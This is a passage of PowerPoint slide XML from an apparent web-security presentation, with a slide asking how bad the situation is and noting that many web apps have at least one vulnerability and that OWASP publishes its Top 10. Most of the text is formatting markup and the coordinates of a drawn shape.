              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>BAD</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="15"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-325"/>
              <a:t>IS</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="60"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0"/>
              <a:t>THE</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="20"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" spc="-25"/>
              <a:t>SITUATION?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962050" y="1446872"/>
            <a:ext cx="5486400" cy="4250055"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="98425" rIns="0" bIns="0" rtlCol="0" vert="horz">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="240029" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="775"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="240029" algn="l"/>
              </a:tabLst>
            </a:pP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Quite</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>bad…</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="5080" indent="-227329">
              <a:lnSpc>
                <a:spcPts val="3020"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1060"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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A</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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b="1">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>significant</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-55" b="1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number</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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of</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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web</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-8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apps</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>is </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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affected</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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by</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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at</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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least</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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one</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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vulnerability</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="240029" marR="67945" indent="-227329">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="955"/>
              </a:spcBef>
              <a:buFont typeface="Arial MT"/>
              <a:buChar char="•"/>
              <a:tabLst>
                <a:tab pos="241300" algn="l"/>
              </a:tabLst>
            </a:pP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The</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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u="sng" sz="2800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId2"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-70">
                <a:solidFill>
                  <a:srgbClr val="00637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(Open</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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Worldwide 	Application</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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Security</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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Project)</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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is</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-7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50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>a </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-50">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>non-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profit</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-1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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>organization</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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that</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-4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collects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	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vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-9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data</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-10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and</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-11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publishes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	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periodic</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-5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reports</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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on</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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the</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-6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20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>most </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>	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prevalent</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-12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vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-114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classes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	</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>OWASP</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-90">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-70">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>Top</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-90">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" u="sng" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="006379"/>
                </a:solidFill>
                <a:uFill>
                  <a:solidFill>
                    <a:srgbClr val="006379"/>
                  </a:solidFill>
                </a:uFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
                <a:hlinkClick r:id="rId3"/>
              </a:rPr>
              <a:t>10</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="2800" spc="-25">
                <a:solidFill>
                  <a:srgbClr val="111F35"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
            <a:endParaRPr sz="2800">
              <a:latin typeface="Calibri"/>
              <a:cs typeface="Calibri"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="4" name="object 4" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="6995839" y="1358768"/>
            <a:ext cx="4740910" cy="4746625"/>
            <a:chOff x="6995839" y="1358768"/>
            <a:chExt cx="4740910" cy="4746625"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="5" name="object 5" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6995833" y="1358772"/>
              <a:ext cx="4740910" cy="4737100"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="4740909" h="4737100">
                  <a:moveTo>
                    <a:pt x="3810863" y="1490370"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3809047" y="1480985"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3734282" y="1436751"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3675570" y="1409700"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3618788" y="1394688"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3574605" y="1401381"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3524986" y="1418526"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3431108" y="1460398"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3398456" y="1409763"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3356940" y="1361986"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3309175" y="1320457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3258566" y="1287792"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3301962" y="1189723"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3318967" y="1138809"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3324250" y="1100061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3309251" y="1043266"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3282188" y="984542"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3239643" y="912317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229953" y="909904"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3214674" y="917016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3212846" y="926401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3253905" y="995705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3279927" y="1050848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3294278" y="1102779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3289731" y="1132268"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3275114" y="1175461"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3231769" y="1274013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229470" y="1256245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3223882" y="1238948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3187255" y="1195120"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3151924" y="1180477"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3133242" y="1178636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3115526" y="1180312"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3068002" y="1205433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3042729" y="1254340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3005366" y="1270635"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2973108" y="1295666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2947047" y="1329753"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2930461" y="1369517"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2923133" y="1413687"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2924822" y="1460982"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935300" y="1510144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2954337" y="1559864"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2899295" y="1544116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2844152" y="1538820"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2797302" y="1542884"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2752725" y="1555026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2651925" y="1400441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2668422" y="1238237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2668740" y="1183246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2661310" y="1159103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2644584" y="1199375"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2629052" y="1287945"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2612720" y="1416786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2673413" y="1573034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2555811" y="1509750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2492171" y="1309547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2473147" y="1263192"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459088" y="1244803"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458770" y="1293228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2479217" y="1392948"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2515095" y="1535938"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2571102" y="1584998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2451671" y="1545183"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2352840" y="1435849"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2313432" y="1398981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2288057" y="1383779"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2300490" y="1420190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2349868" y="1486382"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2426855" y="1578787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2624975" y="1673720"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2613634" y="1704149"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1718360" y="1561833"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1402943" y="1536801"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1045210" y="1529638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="864133" y="1536827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="735431" y="1551190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="685342" y="1563954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="674598" y="1573237"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="675119" y="1587169"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="705497" y="1626666"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="807669" y="1706270"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="950988" y="1796313"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1105357" y="1881098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1240637" y="1944916"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1305356" y="1968042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1435138" y="1998865"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1540357" y="2017534"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1656892" y="2028647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1733296" y="2027415"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1805279" y="2014651"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1844395" y="1997760"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1958365" y="1928977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2001634" y="1908365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2050757" y="1893100"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2107641" y="1885683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2608186" y="1837537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2617965" y="1875116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2632532" y="1912137"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2651836" y="1948078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2675839" y="1982431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2645981" y="1963343"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2615412" y="1949983"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2584094" y="1942147"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2552027" y="1939582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2518765" y="1942122"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2449652" y="1961705"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2413736" y="1978253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2338984" y="2023592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2260130" y="2083587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2176869" y="2156256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1995944" y="2331555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1776501" y="2612225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1589608" y="2933865"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1459611" y="3198609"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1410868" y="3308604"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1520837" y="3259861"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1785518" y="3129826"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2107069" y="2942894"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2387650" y="2723388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2522067" y="2586202"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2634919" y="2459850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2694863" y="2381161"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2740266" y="2306561"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2756890" y="2270696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2776740" y="2201697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2779484" y="2168474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2777083" y="2136063"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2769324" y="2104415"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2755938" y="2073503"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2736685" y="2043290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2771025" y="2067293"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2806954" y="2086610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2843961" y="2101176"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2881528" y="2110968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2825978" y="2668549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2810713" y="2717685"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2790113" y="2760967"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2721292" y="2874975"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2704363" y="2914104"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2694609" y="2956991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2689936" y="3027934"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2693987" y="3115805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2711970" y="3242678"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2728379" y="3322497"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2750909" y="3414179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2777502" y="3487013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2851531" y="3640340"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2947746" y="3810584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3013799" y="3913479"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3074098" y="3993908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3100120" y="4021963"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3140049" y="4046207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3146704" y="4046207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3151860" y="4042448"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3160191" y="4018826"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3173641" y="3945128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3187636" y="3745420"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3186392" y="3413531"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3166313" y="3093034"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3128822" y="2779166"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3014878" y="2105520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045295" y="2094014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3140202" y="2292350"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3225431" y="2363660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3289808" y="2412682"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3331210" y="2434958"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3324110" y="2411171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3288195" y="2371572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3241357" y="2326640"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3173806" y="2267508"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3133991" y="2148052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3183039" y="2204072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3394329" y="2254796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3461385" y="2264181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3473183" y="2263127"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3473945" y="2260854"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3457892" y="2247112"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3412274" y="2228037"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3209213" y="2163356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3145955" y="2045716"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3302152" y="2106422"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3432492" y="2089899"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3521240" y="2074164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559759" y="2057819"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3555847" y="2054085"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3546487" y="2051596"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3459594" y="2051989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3318497" y="2067204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3163963" y="1966379"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3176638" y="1918360"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3179991" y="1867877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3174111" y="1816214"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3159125" y="1764715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192576" y="1778469"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3225939" y="1788363"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3258858" y="1794344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3290951" y="1796351"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3328606" y="1793265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3395459" y="1768182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3448227" y="1713649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3464712" y="1676146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3490722" y="1667535"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3513442" y="1650860"/>
